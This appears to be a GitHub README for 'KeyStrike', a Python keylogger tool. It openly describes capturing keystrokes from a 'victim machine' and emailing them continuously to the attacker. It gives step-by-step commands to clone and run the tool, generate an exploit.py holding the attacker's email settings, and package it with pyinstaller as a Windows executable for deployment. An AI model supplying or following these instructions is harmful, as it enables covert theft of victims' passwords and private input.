<h1>KeyStrike</h1>

A simple Keylogger to detect key logs from the victim machine and send report to the attacker's email continuously.

<h3>How to run:</h3>

```
git clone https://github.com/dr3dd589/KeyStrike.git
cd KeyStrike
pip3 install -r requirements.txt
python3 KeyStrike.py
```
An `exploit.py` file will be generated with your email info where you want to send with a temporary email. To run this exploit on windows you have to convert it to `.exe` file.

You can generate it with `pyinstaller` just run this command:

```
pyinstaller --onefile exploit.py
cd dist
```
`exploit.exe` file is in dist folder now you can use it.
![alt text](https://github.com/dr3dd589/KeyStrike/blob/master/a.png)
